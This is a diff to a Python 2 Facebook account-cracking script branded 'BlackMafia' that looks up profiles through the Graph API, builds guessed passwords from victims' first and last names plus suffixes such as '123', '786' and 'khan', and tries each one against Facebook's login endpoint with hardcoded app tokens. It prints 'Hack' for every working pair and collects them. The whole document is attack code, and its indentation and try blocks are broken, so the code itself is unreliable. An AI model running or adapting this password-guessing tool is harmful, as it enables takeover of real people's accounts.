@@ -108,7 +108,7 @@ jalan('\033[1;94m=========90%')
 jalan('\033[1;94m==========100%')
 print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 
-CorrectUsername = "Testing"
+CorrectUsername = "Test"
 CorrectPassword = "lovehacker"
 
 loop = 'true'
@@ -322,7 +322,8 @@ def pilih_super():
 				print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass1
 				oks.append(user+pass1)
                 try:
-			else:
+			                a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			                b = json.loads(a.text)
 					pass2 = j['first_name'] + '123'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
@@ -330,7 +331,8 @@ def pilih_super():
 						print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass2
 						oks.append(user+pass2)
                 try:
-				        else:
+				                        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			                                b = json.loads(a.text)
 					                pass3 = b['first_name'] + '123'
 					                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					                q = json.load(data)
@@ -338,7 +340,8 @@ def pilih_super():
 						                print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass3
 						                oks.append(user+pass3)
                 try:
-					                else:
+					                                a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			                                                b = json.loads(a.text)
 					                                pass4 = j['first_name'] + '1234'
 					                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					                                q = json.load(data)
@@ -346,7 +349,8 @@ def pilih_super():
 						                                print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass4
 						                                oks.append(user+pass4)
                 try:
-						                        else:
+						                                        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			                                                                b = json.loads(a.text)
 							                                pass5 = b['first_name'] + '1234'
 							                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							                                q = json.load(data)
@@ -354,7 +358,8 @@ def pilih_super():
 								                                print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass5
 								                                oks.append(user+pass5)
                 try:
-							                                else:
+							                                                a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			                                                                                b = json.loads(a.text)
 								                                        pass6 = j['first_name'] + '1235'
 								                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 								                                        q = json.load(data)
@@ -362,7 +367,8 @@ def pilih_super():
 								                                                print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass6
 								                                                oks.append(user+pass6)
                 try:
-								                                        else:
+								                                                        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			                                                                                                b = json.loads(a.text)
 									                                                pass7 = b['first_name'] + '12345'
 									                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									                                                q = json.load(data)
@@ -370,7 +376,8 @@ def pilih_super():
 										                                                print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass7
 										                                                oks.append(user+pass7)
                 try:
-									                                                else:
+									                                                                a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			                                                                                                                b = json.loads(a.text)
 					                                                                                                pass8 = j['first_name'] + '786'
 					                                                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					                                                                                                q = json.load(data)
@@ -378,7 +385,8 @@ def pilih_super():
 						                                                                                                print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass8
 						                						                                oks.append(user+pass8)
                 try:
-															              	else:
+															              	                a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			                                                                                                                                b = json.loads(a.text)
 																	                pass9 = '786786'
 																	                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																	                q = json.load(data)
@@ -386,7 +394,8 @@ def pilih_super():
 																		                print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass9
 																		                oks.append(user+pass9)
                 try:
-																	                else:
+																	                                a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			                                                                                                                                                b = json.loads(a.text)
 											            						                        pass10 = b['first_name'] + '786'
 											             						                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											             						                        q = json.load(data)
@@ -394,7 +403,8 @@ def pilih_super():
 												             						                        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass10
 												              						                        oks.append(user+pass10)
                 try:
-																		                        else:
+																		                                        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			                                                                                                                                                                b = json.loads(a.text)
 																			                                pass11 = 'Pakistan'
 																			                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																			                                q = json.load(data)
@@ -402,7 +412,8 @@ def pilih_super():
 																				                                print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass11
 																				                                oks.append(user+pass11)
                 try:
-																			                                else:
+																			                                                a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			                                                                                                                                                                                b = json.loads(a.text)
 											              						                                                        pass12 = j['last_name'] + '123'
 											              						                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											              						                                                        q = json.load(data)
@@ -410,7 +421,8 @@ def pilih_super():
 												              						              		                                print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass12
 												              						              					        oks.append(user+pass12)
                 try:
-																				                                        else:
+																				                                                        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			                                                                                                                                                                                                b = json.loads(a.text)
 																					             			                pass13 = b['last_name'] + '123'
 																					            			                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																					             			                q = json.load(data)
@@ -418,7 +430,8 @@ def pilih_super():
 																						             			                print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass13
 																						             			                oks.append(user+pass13)
                 try:
-																					             			                else:
+																					             			                                a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			                                                                                                                                                                                                                b = json.loads(a.text)
 											              						              						                                pass14 = j['first_name'] + 'khan'
 											              						              						                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											              						              						                                q = json.load(data)
